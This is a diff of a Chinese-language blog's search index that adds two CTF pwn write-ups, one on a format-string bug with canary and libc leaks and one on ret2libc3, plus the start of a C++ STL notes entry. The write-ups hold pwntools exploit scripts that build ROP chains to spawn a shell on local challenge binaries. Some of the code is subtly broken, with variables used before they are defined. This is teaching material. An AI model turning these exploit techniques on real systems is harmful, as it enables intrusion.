@@ -1,9 +1,94 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>ROUND#14 wp</title>
+    <url>/posts/fa745d1d/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="ROUND-14-love"><a href="#ROUND-14-love" class="headerlink" title="ROUND#14  love"></a>ROUND#14  love</h1><span id="more"></span>
+
+
+
+<h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>程序开启NX和canary保护</p>
+<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308101239901.png" alt="image-20230810123951784"></p>
+<p>vuln函数中存在栈溢出</p>
+<p>变量v4 &#x3D; 555，v5 &#x3D; 520</p>
+<p>read函数读入0x40字节，在printf处有格式化字符串漏洞</p>
+<p>需要注意buf为bss段变量，非栈格式化字符串漏洞不能直接修改栈上的值，需要通过二级指针，即栈链间接修改</p>
+<p>思路：</p>
+<ol>
+<li>利用格式化字符串漏洞任意写修改让v4&#x3D;v5，进入vuln函数</li>
+<li>利用格式化字符串泄露canary和__libc_start_main函数真实地址，计算出libc基址</li>
+<li>构造pay覆盖返回地址为og或system rop链getshell</li>
+</ol>
+<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><h3 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h3><p>将v4写为520。如图在栈偏移为3的地方有一个栈链：0x7ffe9c35d798-&gt;0x7ffe9c35d788&lt;-0x22b，可以用来修改0x22b为0x208</p>
+<p>这里可构造pay为</p>
+<blockquote>
+<p>pay &#x3D; ‘%’+str(8)+’c’+’%9$hhn’</p>
+<p>或者</p>
+<p>pay &#x3D; ‘%’+str(520)+’c’+’%9$hhn’  （也可以直接n不用hhn）</p>
+</blockquote>
+<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308101251928.png" alt="image-20230810125122840"></p>
+<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308101249495.png" alt="image-20230810124947461"></p>
+<h3 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h3><p>泄露canary 和 __libc_start_main地址</p>
+<p>这里需要先patchelf再调试确定偏移</p>
+<p>这题不仅要patch掉libc和ld，还要再patchelf –replace-needed libpthread.so.0 .&#x2F;libpthread-2.31.so .&#x2F;binary</p>
+<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308101359262.png" alt="image-20230810135900218"></p>
+<p>确定canary的偏移为9+6 &#x3D; 15；__libc_start_main+243便宜为11+6 &#x3D; 17</p>
+<blockquote>
+<p>pay +&#x3D; ‘-%15$p-%17$p-‘</p>
+</blockquote>
+<h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>覆盖返回地址为one_gadget，或者调用system函数</p>
+<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308101404124.png" alt="image-20230810140417092"></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;node4.anna.nssctf.cn&#x27;,28157)</span></span><br><span class="line"></span><br><span class="line">sda = <span class="keyword">lambda</span> delim,data :p.sendafter(delim,data)</span><br><span class="line">sd = <span class="keyword">lambda</span> data :p.send(data)</span><br><span class="line">sea = <span class="keyword">lambda</span> delim,data :p.sendafter(delim,data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data :p.sendline(data)</span><br><span class="line">sla = <span class="keyword">lambda</span> delim,data :p.sendlineafter(delim,data)</span><br><span class="line">ru = <span class="keyword">lambda</span> delims,drop=<span class="literal">True</span> :p.recvuntil(delims,drop)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data :u32(data.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data :u64(data.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">lg = <span class="keyword">lambda</span> name,addr :log.success(name+<span class="string">&#x27;=&#x27;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line">ra = <span class="keyword">lambda</span> :p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr64</span>() : <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr32</span>() : <span class="keyword">return</span> u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pay = <span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">520</span>)+<span class="string">&#x27;c&#x27;</span>+<span class="string">&#x27;%9$hhn&#x27;</span></span><br><span class="line">pay += <span class="string">&#x27;-%15$p-%17$p-&#x27;</span></span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">sla(<span class="string">b&#x27;Toka\n&#x27;</span>,pay)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line"><span class="comment">#泄露cannary</span></span><br><span class="line">canary = <span class="built_in">int</span>(ru(<span class="string">&#x27;-&#x27;</span>),<span class="number">16</span>)</span><br><span class="line"><span class="comment">#libc</span></span><br><span class="line">libc_base = <span class="built_in">int</span>(ru(<span class="string">&#x27;-&#x27;</span>),<span class="number">16</span>)-<span class="number">243</span>-libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x00000000004013f3</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#pay=b&#x27;A&#x27;*0x28+p64(canary)+b&#x27;A&#x27;*8+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(elf.sym[&#x27;vuln&#x27;])</span></span><br><span class="line"><span class="comment">#sla(&#x27;level\n&#x27;,pay)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#libcbase = get_addr64()-libc.sym[&#x27;puts&#x27;]</span></span><br><span class="line"><span class="comment">#lg(&#x27;libcbase&#x27;,libcbase)</span></span><br><span class="line">lg(<span class="string">&#x27;canary&#x27;</span>,canary)</span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line"></span><br><span class="line">system_addr = libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">bin_sh_addr=libc_base+libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line"></span><br><span class="line">lg(<span class="string">&#x27;system&#x27;</span>,system_addr)</span><br><span class="line">lg(<span class="string">&#x27;binsh&#x27;</span>,bin_sh_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;level\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret =<span class="number">0x000000000040101a</span> </span><br><span class="line"></span><br><span class="line">og = [<span class="number">0xe3afe</span>,<span class="number">0xe3b01</span>,<span class="number">0xe3b04</span>]</span><br><span class="line">pay = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(canary)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(ret)+p64(og[<span class="number">1</span>]+libc_base)</span><br><span class="line"><span class="comment">#pay = b&#x27;a&#x27;*0x28+p64(canary)+b&#x27;a&#x27;*8+p64(ret)+p64(pop_rdi)+p64(bin_sh_addr)+p64(system_addr)</span></span><br><span class="line"></span><br><span class="line">sl(pay)</span><br><span class="line"></span><br><span class="line">ra()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>赛题复现</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ret2libc3合集</title>
+    <url>/posts/be5100f9/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="ret2libc3"><a href="#ret2libc3" class="headerlink" title="ret2libc3"></a>ret2libc3</h1><p>ctf-wiki ret2libc3<br>考点：栈溢出rop</p>
+<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>file checksec —— 32-bit 开NX</p>
+<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308081254951.png"></p>
+<p>漏洞和内存分析和之前的系列题类似，不赘述了</p>
+<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>IDA看源码，既没有system也没有binsh </p>
+<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308081256604.png" alt="image-20230808125622556"></p>
+<p>由linux延迟绑定机制的知识（后面再写一篇总结吧）可知，我们如果要调用system函数，就要知道他的got表中的地址，但libc被加载到的内存的位置是随机的，我们无法得知<br>不过，同一版本的libc的两个库函数在libc中的相对位置是不变的，所以如果我们可以知道一个已经执行过的函数的got表地址，然后确定libc的版本，就可以加上和system函数的偏移，从而得到system函数的真实地址（got表地址）<br>而现在我们有一个puts函数，libc中也有system和binsh</p>
+<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>我们只需要通过栈溢出利用puts函数，打印puts函数的got表中的地址，然后获取偏移，得到system函数和&#x2F;bin&#x2F;sh字符串的地址，再将puts函数的返回地址覆盖为system函数的地址即可<br>我们可以先运行exp1（见0x04）拿到获取puts的真实地址，然后去<a href="https://libc.blukat.me/?q=__libc_start_main_ret:e81">libc- database -search的网站</a>查询，可得到puts函数system函数和binsh字符串对应的偏移地址</p>
+<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308081257190.png" alt="image-20230808125734100"><br>（这里直接盗图了……)</p>
+<p>知道了puts函数的真实地址和偏移之后，就可以将puts函数的真实地址减去偏移地址，得到libc的基址，将libc的基址分别与system，&#x2F;bin&#x2F;sh字符串的偏移相加，就可以得到对应的真实地址<br>然后写完整的exp </p>
+<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>所以其实exp是分两部的，第一步是构造栈溢出利用puts函数打印出真实地址；第二步是溢出覆盖至system函数和&#x2F;bin&#x2F;sh的地址，拿到shell</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#first exp</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">elf=ELF(&#x27;ret2libc3&#x27;)</span><br><span class="line">p=process(&#x27;./ret2libc3&#x27;)</span><br><span class="line">puts_plt=elf.plt[&#x27;puts&#x27;]</span><br><span class="line">puts_got=elf.got[&#x27;puts&#x27;]</span><br><span class="line">start_addr = elf.symbols[&#x27;_start&#x27;]</span><br><span class="line">payload1=b&#x27;A&#x27;*112+p32(puts_plt)+p32(start_addr)+p32(puts_got)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&quot;!?&quot;,payload1)</span><br><span class="line">puts_addr=u32(p.recv(4))</span><br><span class="line"></span><br><span class="line">print(&quot;puts_got_addr = &quot;,hex(puts_got_addr))</span><br><span class="line">print(&quot;puts_plt_addr = &quot;,hex(puts_plt_addr))</span><br><span class="line">print(&quot;main_plt_addr = &quot;,hex(main_plt_addr))</span><br><span class="line">print(&quot;puts addr = &quot;, hex(puts_addr))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#second exp</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&#x27;./ret2libc3&#x27;)</span><br><span class="line">elf = ELF(&#x27;./ret2libc3&#x27;)</span><br><span class="line"></span><br><span class="line">puts_got_addr = elf.got[&#x27;puts&#x27;]</span><br><span class="line">puts_plt_addr = elf.plt[&#x27;puts&#x27;]</span><br><span class="line">main_plt_addr = elf.symbols[&#x27;_start&#x27;]</span><br><span class="line"></span><br><span class="line">print(&quot;puts_got_addr = &quot;,hex(puts_got_addr))</span><br><span class="line">print(&quot;puts_plt_addr = &quot;,hex(puts_plt_addr))</span><br><span class="line">print(&quot;main_plt_addr = &quot;,hex(main_plt_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u32(p.recv()[0:4])</span><br><span class="line">print(&quot;puts_addr = &quot;,hex(puts_addr))</span><br><span class="line">sys_offset = 0x03cd10</span><br><span class="line">puts_offset = 0x067360</span><br><span class="line">sh_offset = 0x17b8cf</span><br><span class="line"></span><br><span class="line">#根据公式  libc基地址  +  函数偏移量   =  函数真实地址   来计算</span><br><span class="line">libc_base_addr = puts_addr - puts_offset #计算出libc基地址</span><br><span class="line">sys_addr = libc_base_addr + sys_offset #计算出system的真实地址</span><br><span class="line">sh_addr = libc_base_addr + sh_offset #计算出/bin/sh的真实地址</span><br><span class="line"></span><br><span class="line">print(&quot;libc_base_addr = &quot;,hex(libc_base_addr))</span><br><span class="line">print(&quot;sys_addr = &quot;,hex(sys_addr))</span><br><span class="line">print(&quot;sh_addr = &quot;,hex(sh_addr))</span><br><span class="line"></span><br><span class="line">payload2 = flat([b&#x27;A&#x27;*112, p32(sys_addr), &quot;AAAA&quot;, p32(sh_addr)])</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>或者写</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">puts_addr = u64(p.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br></pre></td></tr></table></figure>
+
+<h3 id="一定注意发送pay前接收的内容"><a href="#一定注意发送pay前接收的内容" class="headerlink" title="一定注意发送pay前接收的内容"></a>一定注意发送pay前接收的内容</h3><h3 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h3><p>搜索libc常用方法：</p>
+<ul>
+<li>LibcSearcher</li>
+<li>网站查找 <a href="https://libc.rip/">libc-database</a><br><a href="https://libc.blukat.me/?q=_rtld_global:0">llibc database search</a></li>
+<li>libc-database<br>参考资料：<br><a href="https://blog.csdn.net/weixin_45943522/article/details/120469196">pwn小白入门06–ret2libc</a><br><a href="https://blog.csdn.net/AcSuccess/article/details/104335514">基本ROP之ret2libc3</a><br><a href="https://www.yuque.com/hxfqg9/bin/ug9gx5#MsLuY">yichen二进制安全</a></li>
+</ul>
+<p>对于返回地址不同而导致的输入偏移不同<br><a href="https://www.jianshu.com/p/83f55c55c173">https://www.jianshu.com/p/83f55c55c173</a></p>
+]]></content>
+      <categories>
+        <category>retlibc合集</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>C++STL 学习笔记</title>
     <url>/posts/45592537/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="C-STL-学习笔记"><a href="#C-STL-学习笔记" class="headerlink" title="C++STL 学习笔记"></a>C++STL 学习笔记</h1><h2 id="STL补充"><a href="#STL补充" class="headerlink" title="STL补充"></a>STL补充</h2><h3 id="List-链表"><a href="#List-链表" class="headerlink" title="List  链表"></a>List  链表</h3><ul>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="C-STL-学习笔记"><a href="#C-STL-学习笔记" class="headerlink" title="C++STL 学习笔记"></a>C++STL 学习笔记</h1><span id="more"></span>
+
+<h2 id="STL补充"><a href="#STL补充" class="headerlink" title="STL补充"></a>STL补充</h2><h3 id="List-链表"><a href="#List-链表" class="headerlink" title="List  链表"></a>List  链表</h3><ul>
 <li><p><code> list&lt;int&gt; mylist = &#123; &#125;</code>链表定义和初始化</p>
 </li>
 <li><p><code>void push_front(const T &amp; val) </code> 将 val 插入链表最前面 </p>
